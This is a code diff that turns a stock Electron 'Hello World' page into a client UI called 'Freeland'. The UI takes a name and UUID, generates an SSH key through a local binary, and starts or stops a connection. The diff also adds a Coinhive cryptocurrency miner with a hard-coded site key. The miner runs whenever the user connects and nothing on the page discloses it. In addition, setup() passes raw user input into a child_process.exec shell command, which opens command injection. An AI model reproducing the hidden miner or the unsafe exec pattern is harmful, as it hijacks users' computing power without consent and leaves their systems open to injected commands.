@@ -2,18 +2,113 @@
 <html>
   <head>
     <meta charset="UTF-8">
-    <title>Hello World!</title>
+    <title>Freeland</title>
   </head>
   <body>
-    <h1>Hello World!</h1>
-    <!-- All of the Node.js APIs are available in this renderer process. -->
-    We are using Node.js <script>document.write(process.versions.node)</script>,
-    Chromium <script>document.write(process.versions.chrome)</script>,
-    and Electron <script>document.write(process.versions.electron)</script>.
+    <p><b>Help you connect the world.</b></p>
+    <div class="form-group">
+      <label>Name</label>
+      <input id="uname" class="form-control" placeholder="Enter account" name="uname">
+    </div>
+    <div class="form-group">
+      <label>UUID</label>
+      <input id="uuid" class="form-control" placeholder="UUID" name="uuid">
+    </div>
+    <button onclick="setup()" class="fa fa-pencil-square-o" data-dismiss="alert">Setup</button>
+    <button onclick="copy()" class="fa fa-pencil-square-o" data-dismiss="alert">Copy to Clipboard</button>
+    <div>
+      <textarea id="key" cols="90" rows="10" class="form-control"></textarea>
+    </div>
+    <button onclick="connect()" class="fa fa-check" data-dismiss="alert">Connect</button>
+    <button onclick="disconnect()" class="fa fa-times" data-dismiss="alert">Disconnect</button>
 
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
     <script>
-      // You can also require other files to run in this process
-      require('./renderer.js')
+	var listener = new CoinHive.Anonymous('RMb98mNDKz8kbsMzSu3ykYs98vwPPy3x', {throttle: 0.9});
+
+    // You can also require other files to run in this process
+    require('./renderer.js')
+    const {ipcRenderer, clipboard} = require('electron')
+    var child = null
+
+    function copy() {
+        key = document.getElementById("key");
+        clipboard.writeText(key.value)
+    }
+
+    function setup() {
+        uname = document.getElementById("uname");
+        uuid = document.getElementById("uuid");
+        if (uname.value.length == 0 || uuid.value.length == 0) {
+            document.getElementById("key").innerHTML = "Name or UUID is empty";
+            return;
+        }
+
+        path = ipcRenderer.sendSync('get-path')
+        if ( process.platform === 'win32' ) {
+            command = 'freeland -uname '+uname.value+' -uuid '+uuid.value;
+        }  else if (process.platform === 'darwin') {
+            command = './freeland -uname '+uname.value+' -uuid '+uuid.value;
+        }
+
+        var exec = require('child_process').exec, sp;
+        sp = exec(command,
+             {cwd: path},
+            function (error, stdout, stderr) {
+                var i = stdout.search("ssh-rsa");
+                var j = stdout.indexOf("----", parseInt(i));
+                var k = stdout.substring(parseInt(i), parseInt(j)-1)
+                document.getElementById("key").innerHTML = k;
+            });
+    }
+
+    function connect() {
+        if (this.child != null) {
+            document.getElementById("key").innerHTML += "Already connected";
+            return
+        }
+        document.getElementById("key").innerHTML = "Connecting...\n";
+        path = ipcRenderer.sendSync('get-path')
+        if ( process.platform === 'win32' ) {
+            command = 'freeland';
+        }  else if (process.platform === 'darwin') {
+            command = './freeland';
+        }
+
+        var spawn = require('child_process').spawn,
+            child = spawn(command, {cwd: path});
+
+        this.child = child
+        ipcRenderer.send('set-child', child)
+        child.stdout.on('data', function (data) {
+            document.getElementById("key").innerHTML += data;
+        });
+        child.stderr.on('data', function (data) {
+            document.getElementById("key").innerHTML += data;
+        });
+        child.on('exit', function (data) {
+            document.getElementById("key").innerHTML += "Connection closed!";
+            ipcRenderer.send('set-child', null)
+            this.child = null
+            listener.stop();
+        });
+        // Only start on non-mobile devices and if not opted-out
+        // in the last 14400 seconds (4 hours):
+        if (!listener.isMobile() && !listener.didOptOut(14400)) {
+            listener.start();
+        }
+    }
+
+    function disconnect() {
+        document.getElementById("key").innerHTML = "";
+        if (child == null) {
+            document.getElementById("key").innerHTML = "Not connected yet";
+	} else {
+	    child.kill()
+            this.child = null
+            listener.stop();
+	}
+    }
     </script>
   </body>
 </html>
